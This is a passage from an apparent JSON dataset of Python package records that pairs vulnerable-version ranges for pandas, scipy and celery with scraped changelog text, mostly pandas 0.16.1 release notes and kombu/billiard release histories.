Out[6]: CategoricalIndex(['a', 'a', 'b', 'b', 'c', 'a'], categories=['c', 'a', 'b'], ordered=False, name='B', dtype='category')\n\nindexing with ``__getitem__/.iloc/.loc/.ix`` works similarly to an Index with duplicates.\nThe indexers MUST be in the category or the operation will raise.\n\n.. code-block:: ipython\n\n    In [7]: df2.loc['a']\n    Out[7]:\n       A\n    B\n    a  0\n    a  1\n    a  5\n\nand preserves the ``CategoricalIndex``\n\n.. code-block:: ipython\n\n    In [8]: df2.loc['a'].index\n    Out[8]: CategoricalIndex(['a', 'a', 'a'], categories=['c', 'a', 'b'], ordered=False, name='B', dtype='category')\n\n\nsorting will order by the order of the categories\n\n.. code-block:: ipython\n\n    In [9]: df2.sort_index()\n    Out[9]:\n       A\n    B\n    c  4\n    a  0\n    a  1\n    a  5\n    b  2\n    b  3\n\ngroupby operations on the index will preserve the index nature as well\n\n.. code-block:: ipython\n\n    In [10]: df2.groupby(level=0).sum()\n    Out[10]:\n       A\n    B\n    c  4\n    a  6\n    b  5\n\n    In [11]: df2.groupby(level=0).sum().index\n    Out[11]: CategoricalIndex(['c', 'a', 'b'], categories=['c', 'a', 'b'], ordered=False, name='B', dtype='category')\n\n\nreindexing operations, will return a resulting index based on the type of the passed\nindexer, meaning that passing a list will return a plain-old-``Index``; indexing with\na ``Categorical`` will return a ``CategoricalIndex``, indexed according to the categories\nof the PASSED ``Categorical`` dtype. This allows one to arbitrarily index these even with\nvalues NOT in the categories, similarly to how you can reindex ANY pandas index.\n\n.. code-block:: ipython\n\n    In [12]: df2.reindex(['a', 'e'])\n    Out[12]:\n         A\n    B\n    a  0.0\n    a  1.0\n    a  5.0\n    e  NaN\n\n    In [13]: df2.reindex(['a', 'e']).index\n    Out[13]: pd.Index(['a', 'a', 'a', 'e'], dtype='object', name='B')\n\n    In [14]: df2.reindex(pd.Categorical(['a', 'e'], categories=list('abcde')))\n    Out[14]:\n         A\n    B\n    a  0.0\n    a  1.0\n    a  5.0\n    e  NaN\n\n    In [15]: df2.reindex(pd.Categorical(['a', 'e'], categories=list('abcde'))).index\n    Out[15]: pd.CategoricalIndex(['a', 'a', 'a', 'e'],\n                                 categories=['a', 'b', 'c', 'd', 'e'],\n                                 ordered=False, name='B',\n                                 dtype='category')\n\nSee the :ref:`documentation <advanced.categoricalindex>` for more. (:issue:`7629`, :issue:`10038`, :issue:`10039`)\n\n.. _whatsnew_0161.enhancements.sample:\n\nSample\n^^^^^^\n\nSeries, DataFrames, and Panels now have a new method: :meth:`~pandas.DataFrame.sample`.\nThe method accepts a specific number of rows or columns to return, or a fraction of the\ntotal number or rows or columns. It also has options for sampling with or without replacement,\nfor passing in a column for weights for non-uniform sampling, and for setting seed values to\nfacilitate replication. (:issue:`2419`)\n\n.. ipython:: python\n\n   example_series = pd.Series([0, 1, 2, 3, 4, 5])\n\n    When no arguments are passed, returns 1\n   example_series.sample()\n\n    One may specify either a number of rows:\n   example_series.sample(n=3)\n\n    Or a fraction of the rows:\n   example_series.sample(frac=0.5)\n\n    weights are accepted.\n   example_weights = [0, 0, 0.2, 0.2, 0.2, 0.4]\n   example_series.sample(n=3, weights=example_weights)\n\n    weights will also be normalized if they do not sum to one,\n    and missing values will be treated as zeros.\n   example_weights2 = [0.5, 0, 0, 0, None, np.nan]\n   example_series.sample(n=1, weights=example_weights2)\n\n\nWhen applied to a DataFrame, one may pass the name of a column to specify sampling weights\nwhen sampling from rows.\n\n.. ipython:: python\n\n   df = pd.DataFrame({\"col1\": [9, 8, 7, 6], \"weight_column\": [0.5, 0.4, 0.1, 0]})\n   df.sample(n=3, weights=\"weight_column\")\n\n\n.. _whatsnew_0161.enhancements.string:\n\nString methods enhancements\n^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:ref:`Continuing from v0.16.0 <whatsnew_0160.enhancements.string>`, the following\nenhancements make string operations easier and more consistent with standard python string operations.\n\n\n- Added ``StringMethods`` (``.str`` accessor) to ``Index`` (:issue:`9068`)\n\n  The ``.str`` accessor is now available for both ``Series`` and ``Index``.\n\n  .. ipython:: python\n\n     idx = pd.Index([\" jack\", \"jill \", \" jesse \", \"frank\"])\n     idx.str.strip()\n\n  One special case for the ``.str`` accessor on ``Index`` is that if a string method returns ``bool``, the ``.str`` accessor\n  will return a ``np.array`` instead of a boolean ``Index`` (:issue:`8875`). This enables the following expression\n  to work naturally:\n\n  .. ipython:: python\n\n     idx = pd.Index([\"a1\", \"a2\", \"b1\", \"b2\"])\n     s = pd.Series(range(4), index=idx)\n     s\n     idx.str.startswith(\"a\")\n     s[s.index.str.startswith(\"a\")]\n\n- The following new methods are accessible via ``.str`` accessor to apply the function to each values. (:issue:`9766`, :issue:`9773`, :issue:`10031`, :issue:`10045`, :issue:`10052`)\n\n  ================  ===============  ===============  ===============  ================\n  ..                ..               Methods          ..               ..\n  ================  ===============  ===============  ===============  ================\n  ``capitalize()``  ``swapcase()``   ``normalize()``  ``partition()``  ``rpartition()``\n  ``index()``       ``rindex()``     ``translate()``\n  ================  ===============  ===============  ===============  ================\n\n- ``split`` now takes ``expand`` keyword to specify whether to expand dimensionality. ``return_type`` is deprecated. (:issue:`9847`)\n\n  .. ipython:: python\n\n     s = pd.Series([\"a,b\", \"a,c\", \"b,c\"])\n\n      return Series\n     s.str.split(\",\")\n\n      return DataFrame\n     s.str.split(\",\", expand=True)\n\n     idx = pd.Index([\"a,b\", \"a,c\", \"b,c\"])\n\n      return Index\n     idx.str.split(\",\")\n\n      return MultiIndex\n     idx.str.split(\",\", expand=True)\n\n\n- Improved ``extract`` and ``get_dummies`` methods for ``Index.str`` (:issue:`9980`)\n\n\n.. _whatsnew_0161.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n\n- ``BusinessHour`` offset is now supported, which represents business hours starting from 09:00 - 17:00 on ``BusinessDay`` by default. See :ref:`Here <timeseries.businesshour>` for details. (:issue:`7905`)\n\n  .. ipython:: python\n\n     pd.Timestamp(\"2014-08-01 09:00\") + pd.tseries.offsets.BusinessHour()\n     pd.Timestamp(\"2014-08-01 07:00\") + pd.tseries.offsets.BusinessHour()\n     pd.Timestamp(\"2014-08-01 16:30\") + pd.tseries.offsets.BusinessHour()\n\n- ``DataFrame.diff`` now takes an ``axis`` parameter that determines the direction of differencing (:issue:`9727`)\n\n- Allow ``clip``, ``clip_lower``, and ``clip_upper`` to accept array-like arguments as thresholds (This is a regression from 0.11.0). These methods now have an ``axis`` parameter which determines how the Series or DataFrame will be aligned with the threshold(s). (:issue:`6966`)\n\n- ``DataFrame.mask()`` and ``Series.mask()`` now support same keywords as ``where`` (:issue:`8801`)\n\n- ``drop`` function can now accept ``errors`` keyword to suppress ``ValueError`` raised when any of label does not exist in the target data. (:issue:`6736`)\n\n  .. ipython:: python\n\n    df = pd.DataFrame(np.random.randn(3, 3), columns=[\"A\", \"B\", \"C\"])\n    df.drop([\"A\", \"X\"], axis=1, errors=\"ignore\")\n\n- Add support for separating years and quarters using dashes, for\n  example 2014-Q1.  (:issue:`9688`)\n\n- Allow conversion of values with dtype ``datetime64`` or ``timedelta64`` to strings using ``astype(str)`` (:issue:`9757`)\n- ``get_dummies`` function now accepts ``sparse`` keyword.  If set to ``True``, the return ``DataFrame`` is sparse, e.g. ``SparseDataFrame``. (:issue:`8823`)\n- ``Period`` now accepts ``datetime64`` as value input. (:issue:`9054`)\n\n- Allow timedelta string conversion when leading zero is missing from time definition, ie ``0:00:00`` vs ``00:00:00``. (:issue:`9570`)\n- Allow ``Panel.shift`` with ``axis='items'`` (:issue:`9890`)\n\n- Trying to write an excel file now raises ``NotImplementedError`` if the ``DataFrame`` has a ``MultiIndex`` instead of writing a broken Excel file. (:issue:`9794`)\n- Allow ``Categorical.add_categories`` to accept ``Series`` or ``np.array``. (:issue:`9927`)\n\n- Add/delete ``str/dt/cat`` accessors dynamically from ``__dir__``. (:issue:`9910`)\n- Add ``normalize`` as a ``dt`` accessor method. (:issue:`10047`)\n\n- ``DataFrame`` and ``Series`` now have ``_constructor_expanddim`` property as overridable constructor for one higher dimensionality data. This should be used only when it is really needed, see :ref:`here <extending.subclassing-pandas>`\n\n- ``pd.lib.infer_dtype`` now returns ``'bytes'`` in Python 3 where appropriate. (:issue:`10032`)\n\n\n.. _whatsnew_0161.api:\n\nAPI changes\n~~~~~~~~~~~\n\n- When passing in an ax to ``df.plot( ..., ax=ax)``, the ``sharex`` kwarg will now default to ``False``.\n  The result is that the visibility of xlabels and xticklabels will not anymore be changed. You\n  have to do that by yourself for the right axes in your figure or set ``sharex=True`` explicitly\n  (but this changes the visible for all axes in the figure, not only the one which is passed in!).\n  If pandas creates the subplots itself (e.g. no passed in ``ax`` kwarg), then the\n  default is still ``sharex=True`` and the visibility changes are applied.\n\n- :meth:`~pandas.DataFrame.assign` now inserts new columns in alphabetical order. Previously\n  the order was arbitrary. (:issue:`9777`)\n\n- By default, ``read_csv`` and ``read_table`` will now try to infer the compression type based on the file extension. Set ``compression=None`` to restore the previous behavior (no decompression). (:issue:`9770`)\n\n.. _whatsnew_0161.deprecations:\n\nDeprecations\n^^^^^^^^^^^^\n\n- ``Series.str.split``'s ``return_type`` keyword was removed in favor of ``expand`` (:issue:`9847`)\n\n\n.. _whatsnew_0161.index_repr:\n\nIndex representation\n~~~~~~~~~~~~~~~~~~~~\n\nThe string representation of ``Index`` and its sub-classes have now been unified. These will show a single-line display if there are few values; a wrapped multi-line display for a lot of values (but less than ``display.max_seq_items``; if lots of items (> ``display.max_seq_items``) will show a truncated display (the head and tail of the data). The formatting for ``MultiIndex`` is unchanged (a multi-line wrapped display). The display width responds to the option ``display.max_seq_items``, which is defaulted to 100. (:issue:`6482`)\n\nPrevious behavior\n\n.. code-block:: ipython\n\n   In [2]: pd.Index(range(4), name='foo')\n   Out[2]: Int64Index([0, 1, 2, 3], dtype='int64')\n\n   In [3]: pd.Index(range(104), name='foo')\n   Out[3]: Int64Index([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, ...], dtype='int64')\n\n   In [4]: pd.date_range('20130101', periods=4, name='foo', tz='US/Eastern')\n   Out[4]:\n   <class 'pandas.tseries.index.DatetimeIndex'>\n   [2013-01-01 00:00:00-05:00, ..., 2013-01-04 00:00:00-05:00]\n   Length: 4, Freq: D, Timezone: US/Eastern\n\n   In [5]: pd.date_range('20130101', periods=104, name='foo', tz='US/Eastern')\n   Out[5]:\n   <class 'pandas.tseries.index.DatetimeIndex'>\n   [2013-01-01 00:00:00-05:00, ..., 2013-04-14 00:00:00-04:00]\n   Length: 104, Freq: D, Timezone: US/Eastern\n\nNew behavior\n\n.. ipython:: python\n\n   pd.set_option(\"display.width\", 80)\n   pd.Index(range(4), name=\"foo\")\n   pd.Index(range(30), name=\"foo\")\n   pd.Index(range(104), name=\"foo\")\n   pd.CategoricalIndex([\"a\", \"bb\", \"ccc\", \"dddd\"], ordered=True, name=\"foobar\")\n   pd.CategoricalIndex([\"a\", \"bb\", \"ccc\", \"dddd\"] * 10, ordered=True, name=\"foobar\")\n   pd.CategoricalIndex([\"a\", \"bb\", \"ccc\", \"dddd\"] * 100, ordered=True, name=\"foobar\")\n   pd.date_range(\"20130101\", periods=4, name=\"foo\", tz=\"US/Eastern\")\n   pd.date_range(\"20130101\", periods=25, freq=\"D\")\n   pd.date_range(\"20130101\", periods=104, name=\"foo\", tz=\"US/Eastern\")\n\n\n.. _whatsnew_0161.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Improved csv write performance with mixed dtypes, including datetimes by up to 5x (:issue:`9940`)\n- Improved csv write performance generally by 2x (:issue:`9940`)\n- Improved the performance of ``pd.lib.max_len_string_array`` by 5-7x (:issue:`10024`)\n\n\n.. _whatsnew_0161.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n- Bug where labels did not appear properly in the legend of ``DataFrame.plot()``, passing ``label=`` arguments works, and Series indices are no longer mutated. (:issue:`9542`)\n- Bug in json serialization causing a segfault when a frame had zero length. (:issue:`9805`)\n- Bug in ``read_csv`` where missing trailing delimiters would cause segfault. (:issue:`5664`)\n- Bug in retaining index name on appending (:issue:`9862`)\n- Bug in ``scatter_matrix`` draws unexpected axis ticklabels (:issue:`5662`)\n- Fixed bug in ``StataWriter`` resulting in changes to input ``DataFrame`` upon save (:issue:`9795`).\n- Bug in ``transform`` causing length mismatch when null entries were present and a fast aggregator was being used (:issue:`9697`)\n- Bug in ``equals`` causing false negatives when block order differed (:issue:`9330`)\n- Bug in grouping with multiple ``pd.Grouper`` where one is non-time based (:issue:`10063`)\n- Bug in ``read_sql_table`` error when reading postgres table with timezone (:issue:`7139`)\n- Bug in ``DataFrame`` slicing may not retain metadata (:issue:`9776`)\n- Bug where ``TimdeltaIndex`` were not properly serialized in fixed ``HDFStore`` (:issue:`9635`)\n- Bug with ``TimedeltaIndex`` constructor ignoring ``name`` when given another ``TimedeltaIndex`` as data (:issue:`10025`).\n- Bug in ``DataFrameFormatter._get_formatted_index`` with not applying ``max_colwidth`` to the ``DataFrame`` index (:issue:`7856`)\n- Bug in ``.loc`` with a read-only ndarray data source (:issue:`10043`)\n- Bug in ``groupby.apply()`` that would raise if a passed user defined function either returned only ``None`` (for all input). (:issue:`9685`)\n- Always use temporary files in pytables tests (:issue:`9992`)\n- Bug in plotting continuously using ``secondary_y`` may not show legend properly. (:issue:`9610`, :issue:`9779`)\n- Bug in ``DataFrame.plot(kind=\"hist\")`` results in ``TypeError`` when ``DataFrame`` contains non-numeric columns  (:issue:`9853`)\n- Bug where repeated plotting of ``DataFrame`` with a ``DatetimeIndex`` may raise ``TypeError`` (:issue:`9852`)\n- Bug in ``setup.py`` that would allow an incompat cython version to build (:issue:`9827`)\n- Bug in plotting ``secondary_y`` incorrectly attaches ``right_ax`` property to secondary axes specifying itself recursively. (:issue:`9861`)\n- Bug in ``Series.quantile`` on empty Series of type ``Datetime`` or ``Timedelta`` (:issue:`9675`)\n- Bug in ``where`` causing incorrect results when upcasting was required (:issue:`9731`)\n- Bug in ``FloatArrayFormatter`` where decision boundary for displaying \"small\" floats in decimal format is off by one order of magnitude for a given display.precision (:issue:`9764`)\n- Fixed bug where ``DataFrame.plot()`` raised an error when both ``color`` and ``style`` keywords were passed and there was no color symbol in the style strings (:issue:`9671`)\n- Not showing a ``DeprecationWarning`` on combining list-likes with an ``Index`` (:issue:`10083`)\n- Bug in ``read_csv`` and ``read_table`` when using ``skip_rows`` parameter if blank lines are present. (:issue:`9832`)\n- Bug in ``read_csv()`` interprets ``index_col=True`` as ``1`` (:issue:`9798`)\n- Bug in index equality comparisons using ``==`` failing on Index/MultiIndex type incompatibility (:issue:`9785`)\n- Bug in which ``SparseDataFrame`` could not take ``nan`` as a column name (:issue:`8822`)\n- Bug in ``to_msgpack`` and ``read_msgpack`` zlib and blosc compression support (:issue:`9783`)\n- Bug ``GroupBy.size`` doesn't attach index name properly if grouped by ``TimeGrouper`` (:issue:`9925`)\n- Bug causing an exception in slice assignments because ``length_of_indexer`` returns wrong results (:issue:`9995`)\n- Bug in csv parser causing lines with initial white space plus one non-space character to be skipped. (:issue:`9710`)\n- Bug in C csv parser causing spurious NaNs when data started with newline followed by white space. (:issue:`10022`)\n- Bug causing elements with a null group to spill into the final group when grouping by a ``Categorical`` (:issue:`9603`)\n- Bug where .iloc and .loc behavior is not consistent on empty dataframes (:issue:`9964`)\n- Bug in invalid attribute access on a ``TimedeltaIndex`` incorrectly raised ``ValueError`` instead of ``AttributeError`` (:issue:`9680`)\n- Bug in unequal comparisons between categorical data and a scalar, which was not in the categories (e.g. ``Series(Categorical(list(\"abc\"), ordered=True)) > \"d\"``. This returned ``False`` for all elements, but now raises a ``TypeError``. Equality comparisons also now return ``False`` for ``==`` and ``True`` for ``!=``. (:issue:`9848`)\n- Bug in DataFrame ``__setitem__`` when right hand side is a dictionary (:issue:`9874`)\n- Bug in ``where`` when dtype is ``datetime64/timedelta64``, but dtype of other is not (:issue:`9804`)\n- Bug in ``MultiIndex.sortlevel()`` results in unicode level name breaks (:issue:`9856`)\n- Bug in which ``groupby.transform`` incorrectly enforced output dtypes to match input dtypes. (:issue:`9807`)\n- Bug in ``DataFrame`` constructor when ``columns`` parameter is set, and ``data`` is an empty list (:issue:`9939`)\n- Bug in bar plot with ``log=True`` raises ``TypeError`` if all values are less than 1 (:issue:`9905`)\n- Bug in horizontal bar plot ignores ``log=True`` (:issue:`9905`)\n- Bug in PyTables queries that did not return proper results using the index (:issue:`8265`, :issue:`9676`)\n- Bug where dividing a dataframe containing values of type ``Decimal`` by another ``Decimal`` would raise. (:issue:`9787`)\n- Bug where using DataFrames asfreq would remove the name of the index. (:issue:`9885`)\n- Bug causing extra index point when resample BM/BQ (:issue:`9756`)\n- Changed caching in ``AbstractHolidayCalendar`` to be at the instance level rather than at the class level as the latter can result in unexpected behaviour. (:issue:`9552`)\n- Fixed latex output for MultiIndexed dataframes (:issue:`9778`)\n- Bug causing an exception when setting an empty range using ``DataFrame.loc`` (:issue:`9596`)\n- Bug in hiding ticklabels with subplots and shared axes when adding a new plot to an existing grid of axes (:issue:`9158`)\n- Bug in ``transform`` and ``filter`` when grouping on a categorical variable (:issue:`9921`)\n- Bug in ``transform`` when groups are equal in number and dtype to the input index (:issue:`9700`)\n- Google BigQuery connector now imports dependencies on a per-method basis.(:issue:`9713`)\n- Updated BigQuery connector to no longer use deprecated ``oauth2client.tools.run()`` (:issue:`8327`)\n- Bug in subclassed ``DataFrame``. It may not return the correct class, when slicing or subsetting it. (:issue:`9632`)\n- Bug in ``.median()`` where non-float null values are not handled correctly (:issue:`10040`)\n- Bug in Series.fillna() where it raises if a numerically convertible string is given (:issue:`10092`)\n\n\n.. _whatsnew_0.16.1.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.16.0..v0.16.1\n"}}, {"name": "scipy", "insecurity": [">=0,<0.12.1"], "changelog": {}}, {"name": "celery", "insecurity": ["<4.4.0rc5", "<5.2.0", "<5.2.2", ">=2.1,<2.2.8", ">=2.3,<2.3.4", ">=2.4,<2.4.4", ">=4.0.0rc3,<4.0.1"], "changelog": {"4.2.0": "=====\n:release-date: 2018-05-21 09:00 A.M IST\n:release-by: Omer Katz\n\n- Now passing ``max_retries``, ``interval_start``, ``interval_step``,\n  ``interval_max`` parameters from broker ``transport_options`` to\n  :meth:`~kombu.Connection.ensure_connection` when returning\n  :meth:`~kombu.Connection.default_connection` (Issue 765).\n\n    Contributed by **Anthony Lukach**.\n\n- Qpid: messages are now durable by default\n\n    Contributed by **David Davis**\n\n- Kombu now requires version 2.10.4 or greater of the redis library,\n  in line with Celery\n\n    Contributed by **Colin Jeanne**\n\n- Fixed ImportError in some environments with outdated simplejson\n\n    Contributed by **Aaron Morris**\n\n- MongoDB: fixed failure on MongoDB versions with an \"-rc\" tag\n\n    Contributed by **dust8**\n\n- Ensure periodic polling frequency does not exceed timeout in\n  virtual transport\n\n    Contributed by **Arcadiy Ivanov**\n\n- Fixed string handling when using python-future module\n\n    Contributed by **John Koehl**\n\n- Replaced \"async\" with \"asynchronous\" in preparation for Python 3.7\n\n    Contributed by **Thomas Achtemichuk**\n\n- Allow removing pool size limit when in use\n\n    Contributed by **Alex Hill**\n\n- Codebase improvements and fixes by:\n\n    - **j2gg0s**\n    - **Jon Dufresne**\n    - **Jonas Lergell**\n    - **Mads Jensen**\n    - **Nicolas Delaby**\n    - **Omer Katz**\n\n- Documentation improvements by:\n\n    - **Felix Yan**\n    - **Harry Moreno**\n    - **Mads Jensen**\n    - **Omer Katz**\n    - **Radha Krishna. S.**\n    - **Wojciech Maty\u015bkiewicz**\n\n.. _version-4.1.0:\n\n", "4.1.0": "=====\n:release-date: 2017-07-17 04:45 P.M MST\n:release-by: Anthony Lukach\n\n- SQS: Added support for long-polling on all supported queries. Fixed bug\n  causing error on parsing responses with no retrieved messages from SQS.\n\n    Contributed by **Anthony Lukach**.\n\n- Async hub: Fixed potential infinite loop while performing todo tasks\n  (Issue celery/celery3712).\n\n- Qpid: Fixed bug where messages could have duplicate ``delivery_tag``\n  (Issue 563).\n\n    Contributed by **bmbouter**.\n\n- MongoDB: Fixed problem with using ``readPreference`` option at pymongo 3.x.\n\n    Contributed by **Mikhail Elovskikh**.\n\n- Re-added support for :pypi:``SQLAlchemy``\n\n    Contributed by **Amin Ghadersohi**.\n\n- SQS: Fixed bug where hostname would default to ``localhost`` if not specified\n  in settings.\n\n    Contributed by **Anthony Lukach**.\n\n- Redis: Added support for reading password from transport URL (Issue 677).\n\n    Contributed by **George Psarakis**.\n\n- RabbitMQ: Ensured safer encoding of queue arguments.\n\n    Contributed by **Robert Kopaczewski**.\n\n- Added fallback to :func:``uuid.uuid5`` in :func:``generate_oid`` if\n  :func:``uuid.uuid3`` fails.\n\n    Contributed by **Bill Nottingham**.\n\n- Fixed race condition and innacurrate timeouts for\n  :class:``kombu.simple.SimpleBase`` (Issue 720).\n\n    Contributed by **c-nichols**.\n\n- Zookeeper: Fixed last chroot character trimming\n\n    Contributed by **Dima Kurguzov**.\n\n- RabbitMQ: Fixed bug causing an exception when attempting to close an\n  already-closed connection (Issue 690).\n\n    Contributed by **eavictor**.\n\n- Removed deprecated use of StopIteration in generators and invalid regex\n  escape sequence.\n\n    Contributed by **Jon Dufresne**.\n\n- Added Python 3.6 to CI testing.\n\n    Contributed by **Jon Dufresne**.\n\n- SQS: Allowed endpoint URL to be specified in the boto3 connection.\n\n    Contributed by **georgepsarakis**.\n\n- SQS: Added support for Python 3.4.\n\n    Contributed by **Anthony Lukach**.\n\n- SQS: ``kombu[sqs]`` now depends on :pypi:`boto3` (no longer using\n  :pypi:`boto)`.\n\n    - Adds support for Python 3.4+\n    - Adds support for FIFO queues (Issue 678) and (Issue celery/celery3690)\n    - Avoids issues around a broken endpoints file (Issue celery/celery3672)\n\n    Contributed by **Mischa Spiegelmock** and **Jerry Seutter**.\n\n- Zookeeper: Added support for delaying task with Python 3.\n\n    Contributed by **Dima Kurguzov**.\n\n- SQS: Fixed bug where :meth:`kombu.transport.SQS.drain_events` did not support\n  callback argument (Issue 694).\n\n    Contributed by **Michael Montgomery**.\n\n- Fixed bug around modifying dictionary size while iterating over it\n  (Issue 675).\n\n    Contributed by **Felix Yan**.\n\n- etcd: Added handling for :exc:`EtcdException` exception rather than\n  :exc:`EtcdError`.\n\n    Contributed by **Stephen Milner**.\n\n- Documentation improvements by:\n\n    - **Mads Jensen**\n    - **Matias Insaurralde**\n    - **Omer Katz**\n    - **Dmitry Dygalo**\n    - **Christopher Hoskin**\n\n.. _version-4.0.2:\n\n", "4.0.2": "=====\n:release-date: 2016-12-15 03:31 P.M PST\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 2.1.4\n\n    This new version takes advantage of TCP Keepalive settings on Linux,\n    making it better at detecting closed connections, also in failover\n    conditions.\n\n- Redis: Priority was reversed so, e.g. priority 0 became priority 9.\n\n.. _version-4.0.1:\n\n", "4.0.1": "=====\n:release-date: 2016-12-07 06:00 P.M PST\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 2.1.3\n\n    This new version takes advantage of the new ``TCP_USER_TIMEOUT`` socket option\n    on Linux.\n\n- Producer: Fixed performance degradation when default exchange specified\n  (Issue 651).\n\n- QPid: Switch to using getattr in qpid.Transport.__del__ (Issue 658)\n\n    Contributed by **Patrick Creech**.\n\n- QPid: Now uses monotonic time for timeouts.\n\n- MongoDB: Fixed compatibility with Python 3 (Issue 661).\n\n- Consumer: ``__exit__`` now skips cancelling consumer if connection-related\n  error raised (Issue 670).\n\n- MongoDB: Removes use of natural sort (Issue 638).\n\n    Contributed by **Anton Chaporgin**.\n\n- Fixed wrong keyword argument ``channel`` error (Issue 652).\n\n    Contributed by **Toomore Chiang**.\n\n- Safe argument to ``urllib.quote`` must be bytes on Python 2.x (Issue 645).\n\n- Documentation improvements by:\n\n    - **Carlos Edo**\n    - **Cemre Mengu**\n\n.. _version-4.0:\n\n", "4.0.0": "--------------------\n- Support Sphinx 4.x.\n- Remove dependency to case.\n- Drop support of Python < 3.7.\n- Update to psutil 5.9.0.\n- Add python_requires to enforce Python version.\n- Replace deprecated threading Event.isSet with Event.is_set.\n- Prevent segmentation fault in get_pdeathsig while using ctypes (361).\n- Migrated CI to Github actions.\n- Python 3.10 support added.\n\n\n", "3.6.4.0": "--------------------\n- Issue 309: Add Python 3.9 support to spawnv_passfds()\n- fix 314 \n\n", "3.6.1": "--------------------\n\n- Logging max memory reached at INFO rather than WARNING (255)\n\n-  Pass arguments when wrapping sys.exit (275) \n\n-  Remove win32/py2k special (276) \n\n- Ensure READY messages sent out by exiting worker are consumed prior to it actually existing.\n\n- Pass max_memory_per_child to child worker process (251)\n\n- Fix compatibility with Python 2.7 on Windows (283) \n\n", "3.6.0.0": "--------------------\n\n- Add support of sending parent process death signal.\n\n- Previous fix for handling timeouts caused a problem in warm shutdowns due\n  to use of deepcopy.\n\n  We now use a shallow copy of the cache and do so only when it is needed.\n\n- Cleanup old checks and workarounds for Python versions we no longer support.\n\n", "3.5.0.5": "--------------------\n\n- Fix a crash when handling a timeout.\n- Improve billiard.einfo.Frame compatibility with Python to avoid crashes when using Django.\n- Cleanups.\n\n", "3.5.0.4": "--------------------\n\n- Fix rebuild_ctype losing BufferedWrapper reference on Python 3.\n- Deprecation warning with python 3.6 fixed.\n- Correct spawn start method.\n\n", "3.5.0.3": "--------------------\n\n- Adds Process._authkey alias to .authkey for 2.7 compat.\n- Remove superfluous else clause from max_memory_per_child_check.\n- Document and test all supported Python versions.\n- Extend 'Process' to be compatible with < Py3.5.\n- Use a properly initialized logger in pool.py error logging.\n- _trywaitkill can now kill a whole process group if the worker process declares itself as a group leader.\n- Fix cpython issue 14881 (See https://bugs.python.org/issue14881).\n- Fix for a crash on windows.\n- Fix messaging in case of worker exceeds max memory.\n\n", "3.5.0.2": "--------------------\n\n- max_memory_per_child was measured in kilobytes on Linux, but bytes on\n  *BSD/MacOS, it's now always kilobytes.\n\n- Windows: Adds support for max_memory_per_child, but requires the\n  ``psutil`` package to be installed.\n\n- Fixed bug in ForkingPickler.loadbuf, where it tried to pass\n  a BytesIO instance directly to ``pickle.loads`` on Python 2.7.\n\n", "3.5.0.1": "--------------------\n\n- Connection: Properly handle EINTR (Issue 191).\n\n- Fixed bug with missing CreateProcess for Windows on Python 2.7.\n\n- Adds Process._counter for compatibility with Python <3.5.\n\n", "3.5.0.0": "--------------------\n\n- No longer supports Python 2.6\n\n    You need Python 2.7 or later to use this version of billiard.\n\n- Merged changes from CPython 3.5\n\n", "3.3.0.20": "---------------------\n\n- Pool: Timeouts will attempt to send SIGKILL, but this signal\n  does not exist on Windows.  Replaced with SIGTERM.\n\n", "3.3.0.19": "---------------------\n\n- Pool: Exceptions in user timeout callbacks are now logged instead\n  of crashing the pool.\n\n    Contributed by Pierre Fersing.\n\n- Pool: Exit codes in errors were improperly being represented as signals.\n\n- Pool: ``.map``. and ``.imap`` now working again.\n\n- Now builds on FreeBSD 10.\n\n    Contributed by Michael Fladischer.\n\n", "3.3.0.18": "---------------------\n\n- Now compiles on GNU/kFreeBSD\n\n    Contributed by Michael Fladischer.\n\n- Pool: `AF_PIPE` address fixed so that it works on recent Windows versions\n  in combination with Python 2.7.7.\n\n    Fix contributed by Joshua Tacoma.\n\n- Pool: Fix for `Supervisor object has no attribute _children` error.\n\n    Fix contributed by Andres Riancho.\n\n- Pool: Fixed bug with human_status(None).\n\n- Pool: shrink did not work properly if asked to remove more than 1 process.\n\n\n", "3.3.0.17": "---------------------\n\n- Fixes SemLock on Python 3.4 (Issue 107) when using\n  ``forking_enable(False)``.\n\n- Pool: Include more useful exitcode information when processes exit.\n\n", "3.3.0.16": "---------------------\n\n- Previous release was missing the billiard.py3 package from MANIFEST\n  so the installation would not work on Python 3.\n\n", "3.3.0.15": "---------------------\n\n- Pool: Fixed \"cannot join process not started\" error.\n\n- Now uses billiard.py2 and billiard.py3 specific packages that are installed\n  depending on the python version used.\n\n    This way the installation will not import version specific modules (and\n    possibly crash).\n\n", "3.3.0.14": "---------------------\n\n- Fixed problem with our backwards compatible ``bytes`` wrapper\n  (Issue 103).\n\n- No longer expects frozen applications to have a valid ``__file__``\n  attribute.\n\n    Fix contributed by George Sibble.\n\n", "3.3.0.13": "---------------------\n\n- Fixes compatibility with Python < 2.7.6\n\n- No longer attempts to handle ``SIGBUS``\n\n    Contributed by Vishal Vatsa.\n\n- Non-thread based pool now only handles signals:\n\n    ``SIGHUP``, ``SIGQUIT``, ``SIGTERM``, ``SIGUSR1``,\n    ``SIGUSR2``.\n\n- setup.py: Only show compilation warning for build related commands.\n\n", "3.3.0.12": "---------------------\n\n- Fixed installation for Python 3.\n\n    Contributed by Rickert Mulder.\n\n- Pool: Fixed bug with maxtasksperchild.\n\n    Fix contributed by Ionel Cristian Maries.\n\n- Pool: Fixed bug in maintain_pool.\n\n", "3.3.0.11": "---------------------\n\n- Fixed Unicode error when installing the distribution (Issue 89).\n\n- Daemonic processes are now allowed to have children.\n\n    But note that it will not be possible to automatically\n    terminate them when the process exits.\n\n    See discussion at https://github.com/celery/celery/issues/1709\n\n- Pool:  Would not always be able to 